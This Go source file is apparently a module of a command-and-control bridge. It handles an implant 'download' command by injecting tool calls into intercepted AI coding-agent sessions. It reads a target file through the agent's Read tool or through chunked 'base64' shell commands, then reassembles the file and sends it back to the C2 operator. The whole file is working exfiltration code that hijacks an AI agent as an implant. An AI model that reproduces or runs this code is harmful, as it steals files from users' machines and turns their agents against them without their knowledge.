package bridge

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"

	"github.com/chainreactors/IoM-go/consts"
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
	log "github.com/sirupsen/logrus"
)

// DownloadModule handles the "download" C2 command by deciding a transfer
// strategy (direct Read, probe+decide, or chunked shell+base64).
type DownloadModule struct{}

func (m *DownloadModule) Name() string { return consts.ModuleDownload }

func (m *DownloadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
	dReq := spite.GetDownloadRequest()
	if dReq == nil {
		ctx.SendSpite(sessionID, taskID, execSpite("missing DownloadRequest"))
		ctx.Tasks.Fail(sessionID, taskID, "missing DownloadRequest")
		return
	}

	sess := ctx.WaitForSession(sessionID, DefaultSessionTimeout)
	if sess == nil {
		log.Warnf("[bridge] session %s not found for download injection", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "session not found")
		return
	}
	ctx.Tasks.StartSessionListener(sessionID)

	shellTool := sessions.PickShellTool(sess)
	if shellTool == "" {
		// No shell tool: fall back to direct Read.
		m.handleDirectDownload(ctx, sessionID, taskID, sess, dReq.Path)
		return
	}

	// Probe file size, then decide strategy.
	m.probeAndDownload(ctx, sessionID, taskID, sess, shellTool, dReq.Path)
}

func (m *DownloadModule) handleDirectDownload(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, filePath string) {
	toolName := sessions.PickReadTool(sess)
	if toolName == "" {
		log.Warnf("[bridge] no read tool in session %s", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "no read tool")
		return
	}

	args := sessions.BuildReadArguments(sess, toolName, filePath)
	if _, ok := enqueueToolAction(ctx, sessionID, taskID, toolName, args); !ok {
		return
	}
	log.Infof("[bridge] enqueued direct download task %d for session %s: %s", taskID, sessionID, filePath)

	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
	if ch == nil {
		ctx.Tasks.Fail(sessionID, taskID, "await failed")
		return
	}

	if result, ok := awaitTaskResult(ch, taskID); ok {
		cleaned := sessions.StripReadToolLineNumbers(result.Output)
		sendDownloadResp(ctx, sessionID, taskID, []byte(cleaned))
		ctx.Tasks.Complete(sessionID, taskID)
	} else {
		log.Warnf("[bridge] channel closed without result for direct download task %d session %s", taskID, sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "channel closed")
	}
}

func (m *DownloadModule) probeAndDownload(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, shellTool, filePath string) {
	// Enqueue file-size probe.
	probeCmd := sessions.FileSizeProbeCommand(filePath)
	probeArgs := sessions.BuildCommandArguments(sess, shellTool, probeCmd)
	if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, probeArgs); !ok {
		return
	}

	// Wait for probe result via TaskManager fan-out.
	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
	if ch == nil {
		ctx.Tasks.Fail(sessionID, taskID, "await failed")
		return
	}

	var fileSize int
	if result, ok := awaitTaskResult(ch, taskID); ok {
		var err error
		fileSize, err = sessions.ParseFileSizeOutput(result.Output)
		if err != nil {
			log.Warnf("[bridge] failed to parse file size for %s: %v (output: %q)", filePath, err, result.Output)
			fileSize = 0
		}
	}

	log.Infof("[bridge] probed file size for %s: %d bytes (session %s)", filePath, fileSize, sessionID)

	plan := sessions.PlanDownload(fileSize, sess.UserAgent)

	if plan.Strategy == sessions.StrategyDirectTool {
		readTool := sessions.PickReadTool(sess)
		if readTool != "" {
			args := sessions.BuildReadArguments(sess, readTool, filePath)
			if _, ok := enqueueToolAction(ctx, sessionID, taskID, readTool, args); ok {
				log.Infof("[bridge] enqueued direct read after probe for session %s: %s", sessionID, filePath)
				m.waitForReadResult(ctx, sessionID, taskID, ch)
				return
			}
		}
		// Fall through to shell path.
		plan.Strategy = sessions.StrategyShellBase64
		plan.ChunkSize = sessions.MatchAgentProfile(sess.UserAgent).ChunkSizeBytes
		if fileSize > 0 {
			plan.NumChunks = (fileSize + plan.ChunkSize - 1) / plan.ChunkSize
		} else {
			plan.NumChunks = 1
		}
	}

	// Shell + base64 chunked download.
	if fileSize <= 0 {
		singleCmd := fmt.Sprintf("base64 '%s'", filePath)
		m.executeSingleShell(ctx, sessionID, taskID, shellTool, sess, singleCmd, ch)
		return
	}

	chunks := sessions.GenerateDownloadChunks(filePath, plan)
	if len(chunks) == 0 {
		log.Warnf("[bridge] generated 0 download chunks for session %s", sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "0 chunks")
		return
	}

	log.Infof("[bridge] starting chunked download: %d chunks for session %s", len(chunks), sessionID)
	m.executeChunks(ctx, sessionID, taskID, shellTool, sess, chunks, ch)
}

func (m *DownloadModule) waitForReadResult(ctx ModuleContext, sessionID string, taskID uint32, ch <-chan *sessions.CommandResult) {
	if result, ok := awaitTaskResult(ch, taskID); ok {
		cleaned := sessions.StripReadToolLineNumbers(result.Output)
		sendDownloadResp(ctx, sessionID, taskID, []byte(cleaned))
		ctx.Tasks.Complete(sessionID, taskID)
	} else {
		log.Warnf("[bridge] channel closed without result for download task %d session %s", taskID, sessionID)
		ctx.Tasks.Fail(sessionID, taskID, "channel closed")
	}
}

func (m *DownloadModule) executeSingleShell(ctx ModuleContext, sessionID string, taskID uint32, shellTool string, sess *sessions.Session, shellCmd string, ch <-chan *sessions.CommandResult) {
	args := sessions.BuildCommandArguments(sess, shellTool, shellCmd)
	if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, args); !ok {
		return
	}

	if result, ok := awaitTaskResult(ch, taskID); ok {
		decoded, err := sessions.DecodeBase64Output(result.Output)
		if err != nil {
			log.Errorf("[bridge] failed to decode base64 download for session %s: %v", sessionID, err)
			ctx.Tasks.Fail(sessionID, taskID, "decode failed")
			return
		}
		sendDownloadResp(ctx, sessionID, taskID, decoded)
		ctx.Tasks.Complete(sessionID, taskID)
	} else {
		log.Warnf("[bridge] channel closed without result for single shell download task %d", taskID)
		ctx.Tasks.Fail(sessionID, taskID, "channel closed")
	}
}

func (m *DownloadModule) executeChunks(ctx ModuleContext, sessionID string, taskID uint32, shellTool string, sess *sessions.Session, chunks []sessions.DownloadChunk, ch <-chan *sessions.CommandResult) {
	var assembled []byte

	for i, chunk := range chunks {
		args := sessions.BuildCommandArguments(sess, shellTool, chunk.Command)
		if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, args); !ok {
			return
		}
		log.Infof("[bridge] enqueued download chunk %d/%d for session %s", i+1, len(chunks), sessionID)

		// Wait for chunk result.
		result, ok := awaitTaskResult(ch, taskID)
		if !ok {
			log.Errorf("[bridge] download chunk %d/%d failed for session %s", i+1, len(chunks), sessionID)
			ctx.Tasks.Fail(sessionID, taskID, "chunk failed")
			return
		}

		decoded, err := sessions.DecodeBase64Output(result.Output)
		if err != nil {
			log.Errorf("[bridge] failed to decode download chunk %d/%d for session %s: %v", i+1, len(chunks), sessionID, err)
			ctx.Tasks.Fail(sessionID, taskID, "decode failed")
			return
		}

		assembled = append(assembled, decoded...)
		log.Infof("[bridge] download chunk %d/%d decoded: %d bytes (total: %d) for session %s",
			i+1, len(chunks), len(decoded), len(assembled), sessionID)
	}

	log.Infof("[bridge] all %d download chunks assembled: %d bytes for session %s", len(chunks), len(assembled), sessionID)
	sendDownloadResp(ctx, sessionID, taskID, assembled)
	ctx.Tasks.Complete(sessionID, taskID)
}

// sendDownloadResp sends a DownloadResponse via ModuleContext.
func sendDownloadResp(ctx ModuleContext, sessionID string, taskID uint32, content []byte) {
	hash := sha256.Sum256(content)
	checksum := hex.EncodeToString(hash[:])

	spite := &implantpb.Spite{
		Name: consts.ModuleDownload,
		Body: &implantpb.Spite_DownloadResponse{
			DownloadResponse: &implantpb.DownloadResponse{
				Content:  content,
				Checksum: checksum,
				Size:     uint64(len(content)),
			},
		},
	}
	if err := ctx.SendSpite(sessionID, taskID, spite); err != nil {
		log.Errorf("[bridge] failed to send download response task %d: %v", taskID, err)
	} else {
		log.Infof("[bridge] sent download response task %d for session %s (%d bytes)", taskID, sessionID, len(content))
	}
}
